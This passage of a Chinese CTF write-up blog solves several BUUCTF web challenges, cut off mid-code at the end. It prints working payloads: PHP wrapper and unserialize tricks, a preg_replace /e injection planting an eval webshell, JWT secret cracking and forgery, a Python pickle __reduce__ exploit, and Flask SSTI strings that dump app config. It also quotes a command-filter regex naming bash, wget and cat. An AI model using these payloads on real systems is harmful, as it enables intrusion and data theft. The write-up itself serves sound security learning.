<p>1、使用<code>php://input</code>伪协议绕过<br>  ①将要<code>GET</code>的参数<code>?xxx=php://input</code><br>  ②用<code>post</code>方法传入想要file_get_contents()函数返回的值<br>2、用<code>data://</code>伪协议绕过<br>  ①将url改为：<code>?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码</code><br>  ②或者将url改为：<code>?xxx=data:text/plain,(url编码的内容)</code><br>3、利用<code>远程文件读取</code>绕过</p>
</blockquote>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，给出了一段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过审计代码可知：需要<code>GET</code>方式上传三个参数<code>text</code>、<code>file</code>、<code>password</code>，并且三个参数需要满足：</p>
<ul>
<li><code>text</code>参数传入的值会用<code>file_get_contents</code>去访问，初步猜测是<code>远程文件读取</code>，后来测试发现这里不行，需要用伪协议；</li>
<li><code>file</code>参数可以传入文件名，这个文件会被<code>include()</code>包含，看到这猜测肯定有文件包含，并且提示了<code>useless.php</code>，肯定是要看它的代码的；</li>
<li><code>password</code>会进行反序列化，还没看出他的用处。</li>
</ul>
<h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>首先构造payload：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">text</span>=data:text/plain,welcome <span class="keyword">to</span> the zjctf&amp;<span class="attribute">file</span>=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1</span><br></pre></td></tr></table></figure>
<p>成功读取到<code>useless.php</code>的代码，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们看到，这里构造了一个<code>Flag</code>类，并且在此处可以读到<code>flag.php</code>的内容，由此得知<code>password</code>传入的肯定是此处序列化的内容，可以用下面的代码拿到序列化的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>然后再构造payload读取flag：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">text</span>=data:<span class="built_in">text</span>/plain,welcome <span class="keyword">to</span> <span class="keyword">the</span> zjctf&amp;<span class="built_in">file</span>=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>查看源码拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web41.png" alt=""></p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>是上道题的改版，原题是支持<code>远程文件读取</code>的，但是放到<code>BUU</code>上好像不行了… 这道题在上道题的基础上考了<code>preg_replace()</code>的RCE。<br>本RCE参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>相同的操作拿到<code>next.php</code>的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们看到语句<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str)</code>中采用了<code>preg_replace/e</code>模式，因此可以利用上面提到的RCE来写入小马，构造payload如下：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">next</span>.php?id=<span class="number">1</span>&amp;\S*=$&#123;<span class="built_in">eval</span>($_POST[x])&#125;</span><br></pre></td></tr></table></figure>
<p>这样构造的原因：</p>
<ul>
<li><code>preg_replace</code>函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图preg_replace函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>字符串，就需要想办法来执行它。</li>
<li>上面的命令执行，相当于<code>eval(&#39;strtolower(&quot;\\1&quot;);&#39;)</code>结果，当中的<code>\\1</code>实际上就是<code>\1</code>，而<code>\1</code>在正则表达式中有自己的含义：<blockquote>
<p>对一个正则表达式模式或部分模式<strong>两边添加圆括号</strong>将导致相关<strong>匹配存储到一个临时缓冲区中</strong>，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从<code>1</code>开始，最多可存储<code>99</code>个捕获的子表达式。每个缓冲区都可以使用<code>&#39;\n&#39;</code>访问，其中<code>n</code>为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
</li>
<li>所以这里的<code>\1</code>实际上指定的是第一个子匹配项，参考前面的链接，我们传入<code>\S*=${eval($_POST[x])}</code>便可以将小马写入(<code>S</code>原本是<code>.</code>，但是传参数首字符是特殊字符的时候会被替换为<code>_</code>，用<code>S</code>可以绕过)。</li>
</ul>
<h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><p>用上面的payload写入小马，然后用蚁剑连接拿到shell，即可拿到flag。注意这里我们并没有把上面的语句写入到指定的文件，而是访问的时候<code>${eval($_POST[x])}</code>语句首先被执行了，因此才可以连接上，那么我们连接的时候用的也就是整个<code>url</code>了。</p>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>考察<code>is_numeric()</code>和<code>strcmp()</code>两个函数的漏洞</p>
<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><ul>
<li><p>php中的strcmp漏洞</p>
<blockquote>
<p>传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数接受到了不符合的类型将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，仍将<code>return 0</code>（表示两个字符串相等）。那么利用数组即可绕过判断。</p>
</blockquote>
</li>
<li><p>php中的is_numeric()漏洞</p>
<blockquote>
<p><code>is_numeric</code>函数对于空字符<code>%00</code>，无论是<code>%00</code>放在前后都可以判断为非数值，而<code>%20</code>空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断。</p>
</blockquote>
</li>
</ul>
<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>在<code>PAYFLAG</code>页面源码中发现如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>提示我们传入<code>money</code>和<code>password</code>，可以看到利用<code>password=404%20</code>即可绕过<code>is_numeric</code>的判断。<br>抓包发现<code>cookie</code>值为<code>0</code>，而并没有采用<code>PHPSESSID</code>，将其改为<code>1</code>即可，发送之后回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web42.png" alt=""><br>从中看到了对<code>money</code>的判断，看到PHP版本是5.3的，猜测是<code>strcmp</code>函数比较的，利用数组绕过即可。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web43.png" alt=""><br>成功拿到flag。**其实对于money的绕过还可以采用科学计数法<code>money=1e11</code>。</p>
<h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="[CISCN 2019]ikun"></a>[CISCN 2019]ikun</h2><p>考察<strong>薅羊毛逻辑漏洞</strong>：通过抓包修改折扣等数据来购买flag；<strong>jwt-cookies伪造</strong>、<strong>python反序列化</strong></p>
<h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后提示要买到<code>lv6</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web51.png" alt=""><br>我们看到每个商品都有个等级的标签，查看标签命名是<code>lvx.png</code>，因此若要找到<code>lv6</code>的地方，可以用下面的脚本代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">       <span class="keyword">print</span> (i)</span><br><span class="line">       <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>跑出来<code>lv6</code>在181页，但是发现太贵了…<br>抓包发现可以设置折扣，这里就用到了<strong>薅羊毛逻辑漏洞</strong>。<br>然后页面返回提示需要是<code>admin</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web52.png" alt=""><br>抓包发现cookie采用了<code>JWT</code>(此处可了解<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT</a>)，我们把<code>JWT</code>拿去base64解码得到</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;&#123;<span class="string">"username"</span>:<span class="string">"123"</span>&#125;¶«<span class="attribute">L</span>=mð¢ÖÙJhÎö7Éq"&gt;[¿</span><br></pre></td></tr></table></figure>
<p>其中<code>username</code>中是我们登录的用户名，等下伪造<code>JWT</code>时改为<code>admin</code>即可；<br>另外，伪造<code>JWT</code>还需要秘钥，可以利用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>来破解：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web53.png" alt=""><br>拿到秘钥之后，到<a href="https://jwt.io/">JWT生成网站</a>伪造admin的JWT：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web54.png" alt=""><br>拿伪造的<code>JWT</code>伪装成管理员，然后得到了一个压缩包的地址：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web55.png" alt=""></p>
<p>然后需要<code>成为大会员</code>，BP抓包发现是利用<code>become</code>传参，在源码的<code>Admin.py</code>中找到了这个参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>我们看到，这个地方利用了<code>pickle.loads</code>对<code>become</code>传参进行反序列化(关于<a href="https://blog.csdn.net/weixin_38278334/article/details/82967813">pickle</a>)，现在就需要构造可读取flag文件的序列化字符串赋给<code>become</code>利用Python反序列化的漏洞拿到flag。</p>
<h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><p><img src="http://www.ggb0n.cool/images/BUUCTF-web57.png" alt=""><br>从图中看到：我们可以利用<strong><strong>reduce</strong></strong>，当<strong>reduce</strong>被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt，EXP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = parse.quote(a)</span><br><span class="line"><span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
<p>生成payload：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br></pre></td></tr></table></figure>
<p>利用前面伪造的<code>JWT</code>同时将上面的payload传给参数become即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web56.png" alt=""><br>关于Python反序列化漏洞的参考：<br><strong>Pickle反序列化漏洞</strong>：<a href="https://xz.aliyun.com/t/2289">https://xz.aliyun.com/t/2289</a><br><strong>cPickle反序列化漏洞</strong>：<a href="https://blog.csdn.net/SKI_12/article/details/85015803">https://blog.csdn.net/SKI_12/article/details/85015803</a><br><strong>Python-sec的一些总结</strong>：<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>考察<code>unicode</code>安全问题，参考如下链接：<br><a href="https://xz.aliyun.com/t/5402">浅谈Unicode设计的安全性</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a><br><a href="http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs">UNICODE SECURITY CONSIDERATIONS</a></p>
<h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><p>查看源码发现在<code>charset=UTF-8</code>处提示<code>Ah,really important,seriously.</code>，说明是考察与unicode安全相关的知识，再看题目页面，可以买四种独角兽，但是前三种价格都是一位数，而第四个却是四位数，猜测flag就在第四个。<br>但是输入框只能输入一个字符，参考网上的资料，到前面的网站找一个大于1337的特殊unicode字符，然后将其进行url编码填入输入框拿到flag。<br>可以去<a href="https://www.compart.com/en/unicode/">这里</a>找。</p>
<h2 id="WesternCTF-2018-shrine"><a href="#WesternCTF-2018-shrine" class="headerlink" title="[WesternCTF 2018]shrine"></a>[WesternCTF 2018]shrine</h2><p>考察<code>SSTI</code>服务端模板注入，参考<a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p>
<h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到<code>/shrine/</code>路径下存在对用户输入到模板数据的过滤，<code>(</code>、<code>)</code>被替换为空，<code>config</code>、<code>self</code>都被黑名单过滤掉，但是还是避免不了存在SSTI，先拿一个数学表达式测试一下：<code>2</code>，发现可以执行。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web58.png" alt=""><br>接着看代码，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br></pre></td></tr></table></figure>
<p>这里注册一个名为<code>FLAG</code>的<code>config</code>，flag应该就在这，这个地方原本可以直接通过<code></code>读取所有<code>app.config</code>的内容的，但是前面说过<code>config</code>已经被过滤了：下面这行代码就是将<code>config</code>和<code>self</code>替换为空。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])</span><br></pre></td></tr></table></figure>
<p>但是这里黑名单过滤的内容比较少，其实还有其他内置函数能实现同样的功能，如<strong>url_for</strong>和<strong>get_flashed_messages</strong><br>关于这两个函数可以参考：<a href="https://www.jianshu.com/p/bcf57a3092ce">https://www.jianshu.com/p/bcf57a3092ce</a></p>
<h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><p>直接上payload了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>读取到flag如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web59.png" alt=""><br><code>PHP</code>中也有很多模板渲染的漏洞，以后遇到了慢慢学吧。<br>附上一个模板注入点扫描工具<a href="https://github.com/epinna/tplmap">tplmap</a></p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>考察多次编码，<code>MD5</code>强碰撞</p>
<h3 id="题目分析-9"><a href="#题目分析-9" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，看题目的url发现了可疑的参数<code>img</code>和<code>cmd</code>，并且<code>img</code>的值是一串base64，解码之后还是base64，再解码拿到一串hex码，最终解码是<code>555.png</code>，这就说明，读取文件的时候是先进行hex编码，然后两次base64编码传参，那么我们利用这个特点就可以读其他文件了。<br>先看<code>index.php</code>的内容，三次编码传参之后拿到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; 